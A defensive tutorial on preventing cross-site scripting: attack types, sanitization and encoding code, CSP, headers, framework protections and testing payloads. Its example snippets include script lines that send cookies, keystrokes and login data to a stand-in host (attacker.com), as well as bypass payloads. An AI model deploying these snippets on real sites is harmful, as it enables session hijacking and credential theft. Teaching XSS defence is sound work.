# Cross-Site Scripting (XSS) Prevention Guide

## What is Cross-Site Scripting (XSS)?

Cross-Site Scripting (XSS) is a security vulnerability where malicious scripts are injected into trusted websites. These scripts execute in users' browsers, potentially stealing sensitive information, session tokens, or performing actions on behalf of the user.

## Types of XSS Attacks

### 1. Stored XSS (Persistent)
Malicious script is permanently stored on the target server (database, message forum, comment field).

**Example**:
```html
<!-- Malicious comment stored in database -->
<script>
  // Steal user's session cookie
  document.location='http://attacker.com/steal.php?cookie='+document.cookie;
</script>
```

### 2. Reflected XSS (Non-Persistent)
Malicious script is reflected off a web server, typically through URL parameters or form submissions.

**Example**:
```
http://vulnerable-site.com/search?q=<script>alert('XSS')</script>
```

### 3. DOM-Based XSS
The vulnerability exists in client-side code rather than server-side, manipulating the DOM environment.

**Example**:
```javascript
// Vulnerable code
document.getElementById('welcome').innerHTML = "Hello " + location.search.substring(1);

// Malicious URL: http://site.com/page.html?<script>alert('XSS')</script>
```

## Dangers of XSS Attacks

### 1. Session Hijacking
```javascript
// Steal session cookies
new Image().src = "http://attacker.com/log.php?cookie=" + document.cookie;
```

### 2. Data Theft
```javascript
// Send form data to attacker
var forms = document.forms;
for(var i = 0; i < forms.length; i++) {
    // Send form data to malicious server
}
```

### 3. Defacement
```javascript
// Modify page content
document.body.innerHTML = "<h1>Site Hacked!</h1>";
```

### 4. Phishing
```javascript
// Create fake login form
document.body.innerHTML = '<form action="http://attacker.com/phish.php">...</form>';
```

### 5. Keylogging
```javascript
// Capture keystrokes
document.addEventListener('keypress', function(e) {
    new Image().src = "http://attacker.com/log.php?key=" + e.key;
});
```

## Prevention Techniques

### 1. Input Validation and Sanitization

**Server-Side Validation (Python/Flask)**:
```python
import html
import re
from bleach import clean

def sanitize_input(user_input):
    """Sanitize user input to prevent XSS"""
    # HTML escape
    escaped = html.escape(user_input)
    
    # Remove dangerous patterns
    dangerous_patterns = [
        r'<script.*?</script>',
        r'javascript:',
        r'on\w+\s*=',  # event handlers like onclick, onload
        r'<iframe.*?</iframe>',
        r'<object.*?</object>',
        r'<embed.*?</embed>'
    ]
    
    for pattern in dangerous_patterns:
        escaped = re.sub(pattern, '', escaped, flags=re.IGNORECASE | re.DOTALL)
    
    return escaped

# Using bleach library for HTML sanitization
def clean_html_content(content):
    """Clean HTML content, allowing only safe tags"""
    allowed_tags = ['p', 'b', 'i', 'u', 'em', 'strong', 'a', 'ul', 'ol', 'li']
    allowed_attributes = {'a': ['href', 'title']}
    
    return clean(content, tags=allowed_tags, attributes=allowed_attributes)
```

**Client-Side Validation (JavaScript)**:
```javascript
function sanitizeInput(input) {
    // Create a temporary element to leverage browser's HTML parsing
    const temp = document.createElement('div');
    temp.textContent = input;
    return temp.innerHTML;
}

function validateInput(input) {
    // Check for suspicious patterns
    const dangerous_patterns = [
        /<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi,
        /javascript:/gi,
        /on\w+\s*=/gi,
        /<iframe/gi,
        /<object/gi,
        /<embed/gi
    ];
    
    return !dangerous_patterns.some(pattern => pattern.test(input));
}
```

### 2. Output Encoding

**HTML Entity Encoding**:
```python
def html_encode(text):
    """Encode HTML entities"""
    return (text
            .replace('&', '&amp;')
            .replace('<', '&lt;')
            .replace('>', '&gt;')
            .replace('"', '&quot;')
            .replace("'", '&#x27;'))

# Usage in templates
@app.route('/display')
def display_content():
    user_content = request.args.get('content', '')
    safe_content = html_encode(user_content)
    return f"<div>{safe_content}</div>"
```

**JavaScript Encoding**:
```javascript
function escapeHtml(unsafe) {
    return unsafe
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");
}

// Safe DOM manipulation
function updateContent(userInput) {
    // Use textContent instead of innerHTML
    document.getElementById('output').textContent = userInput;
    
    // Or use safe HTML encoding
    document.getElementById('output').innerHTML = escapeHtml(userInput);
}
```

### 3. Content Security Policy (CSP)

**Basic CSP Header**:
```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline';
```

**Strict CSP Implementation**:
```html
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; 
               script-src 'self' 'nonce-random123' 'strict-dynamic'; 
               style-src 'self' 'unsafe-inline'; 
               img-src 'self' data: https:; 
               connect-src 'self'; 
               font-src 'self'; 
               object-src 'none'; 
               base-uri 'self'; 
               form-action 'self';">
```

**Using Nonces for Inline Scripts**:
```html
<!-- Server generates unique nonce for each request -->
<script nonce="random123">
    // This script will execute because it has the correct nonce
    console.log('Safe inline script');
</script>
```

### 4. HTTP Security Headers

```http
# Prevent MIME type sniffing
X-Content-Type-Options: nosniff

# Enable XSS filtering in browsers
X-XSS-Protection: 1; mode=block

# Control framing to prevent clickjacking
X-Frame-Options: DENY

# Referrer policy
Referrer-Policy: strict-origin-when-cross-origin
```

### 5. Framework-Specific Protection

**React.js Protection**:
```jsx
function UserProfile({ userData }) {
    // React automatically escapes content
    return (
        <div>
            <h1>{userData.name}</h1> {/* Safe - automatically escaped */}
            <p>{userData.bio}</p>
        </div>
    );
}

// Dangerous - avoid dangerouslySetInnerHTML
function UnsafeComponent({ htmlContent }) {
    return (
        <div dangerouslySetInnerHTML={{__html: htmlContent}} />
    );
}

// Safe alternative using DOMPurify
import DOMPurify from 'dompurify';

function SafeHTMLComponent({ htmlContent }) {
    const cleanHTML = DOMPurify.sanitize(htmlContent);
    return (
        <div dangerouslySetInnerHTML={{__html: cleanHTML}} />
    );
}
```

**Django Protection**:
```python
# Django templates auto-escape by default
# template.html
<p>{{ user_input }}</p>  <!-- Automatically escaped -->

# To output raw HTML (dangerous)
<p>{{ user_input|safe }}</p>

# Safe way to output user HTML
from django.utils.html import escape
<p>{{ user_input|escape }}</p>

# In views
def display_content(request):
    user_content = request.GET.get('content', '')
    # Django automatically escapes template variables
    return render(request, 'display.html', {'content': user_content})
```

## Testing for XSS Vulnerabilities

### 1. Manual Testing Payloads

**Basic Test Payloads**:
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
javascript:alert('XSS')
<iframe src="javascript:alert('XSS')"></iframe>
<body onload=alert('XSS')>
```

**Advanced Payloads**:
```html
<!-- Event handler injection -->
" onclick="alert('XSS')" "

<!-- HTML entity encoding bypass -->
&lt;script&gt;alert('XSS')&lt;/script&gt;

<!-- URL encoding bypass -->
%3Cscript%3Ealert('XSS')%3C/script%3E

<!-- Unicode encoding -->
\u003cscript\u003ealert('XSS')\u003c/script\u003e
```

### 2. Automated Testing Tools

**OWASP ZAP Script**:
```python
# Basic ZAP API usage for XSS testing
from zapv2 import ZAPv2

zap = ZAPv2(proxies={'http': 'http://127.0.0.1:8080', 
                     'https': 'http://127.0.0.1:8080'})

# Spider the target
target = 'http://example.com'
zap.spider.scan(target)

# Active scan for vulnerabilities
zap.ascan.scan(target)

# Get XSS alerts
alerts = zap.core.alerts()
xss_alerts = [alert for alert in alerts if 'Cross Site Scripting' in alert['name']]
```

### 3. Browser Developer Tools Testing

```javascript
// Test in browser console
console.log('Testing XSS in input field');

// Try to inject script through form inputs
document.getElementById('userInput').value = '<script>alert("XSS")</script>';

// Check if content is properly escaped
console.log(document.getElementById('output').innerHTML);
```

## Secure Coding Practices

### 1. Input Validation Rules

```python
import re

def validate_user_input(input_data, input_type):
    """Validate user input based on expected type"""
    
    validators = {
        'email': r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$',
        'username': r'^[a-zA-Z0-9_]{3,20}$',
        'phone': r'^\+?1?-?\.?\s?\(?[0-9]{3}\)?[\s.-]?[0-9]{3}[\s.-]?[0-9]{4}$',
        'alphanumeric': r'^[a-zA-Z0-9\s]+$'
    }
    
    if input_type in validators:
        return bool(re.match(validators[input_type], input_data))
    
    return False

# Usage
email = "user@example.com"
if validate_user_input(email, 'email'):
    # Process valid email
    pass
```

### 2. Template Security

**Secure Template Usage**:
```html
<!-- Django template - auto-escaped -->
<div class="user-content">
    {{ user_content }}  <!-- Safe -->
</div>

<!-- Manual escaping when needed -->
<div class="user-content">
    {{ user_content|escape }}
</div>

<!-- For trusted HTML content -->
{% load custom_filters %}
<div class="user-content">
    {{ user_content|safe_html }}  <!-- Custom filter with sanitization -->
</div>
```

### 3. API Security

```python
from flask import Flask, request, jsonify
import json

app = Flask(__name__)

@app.route('/api/comment', methods=['POST'])
def add_comment():
    try:
        # Validate content type
        if not request.is_json:
            return jsonify({'error': 'Content-Type must be application/json'}), 400
        
        data = request.get_json()
        
        # Validate required fields
        if 'comment' not in data:
            return jsonify({'error': 'Comment field required'}), 400
        
        # Sanitize input
        comment = sanitize_input(data['comment'])
        
        # Additional validation
        if len(comment) > 1000:
            return jsonify({'error': 'Comment too long'}), 400
        
        # Store safely
        # ... database operation with parameterized queries
        
        return jsonify({'status': 'success', 'comment_id': 123})
        
    except Exception as e:
        return jsonify({'error': 'Internal server error'}), 500
```

## Resources and Tools

### Security Libraries
- **Python**: `bleach`, `html`, `markupsafe`
- **JavaScript**: `DOMPurify`, `xss`
- **Java**: `OWASP Java Encoder`, `AntiSamy`
- **PHP**: `HTMLPurifier`, `filter_var`

### Testing Tools
- **OWASP ZAP**: Free security testing proxy
- **Burp Suite**: Professional web security testing
- **XSSHunter**: Blind XSS detection
- **BeEF**: Browser exploitation framework

### Learning Resources
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security/cross-site-scripting)
- [Mozilla Web Security Guidelines](https://infosec.mozilla.org/guidelines/web_security)

## Quick Reference Checklist

### ✅ Prevention Checklist
- [ ] All user input is validated and sanitized
- [ ] Output is properly encoded for context (HTML, JavaScript, CSS, URL)
- [ ] Content Security Policy is implemented
- [ ] Security headers are configured
- [ ] Framework security features are enabled
- [ ] No dangerous functions (`eval`, `innerHTML`) with user data
- [ ] Regular security testing is performed
- [ ] Security code reviews are conducted

### ⚠️ Common Mistakes to Avoid
- [ ] Relying only on client-side validation
- [ ] Using blacklist instead of whitelist approach
- [ ] Forgetting to encode output in all contexts
- [ ] Trusting data from APIs without validation
- [ ] Not updating security libraries regularly
- [ ] Ignoring security headers and CSP
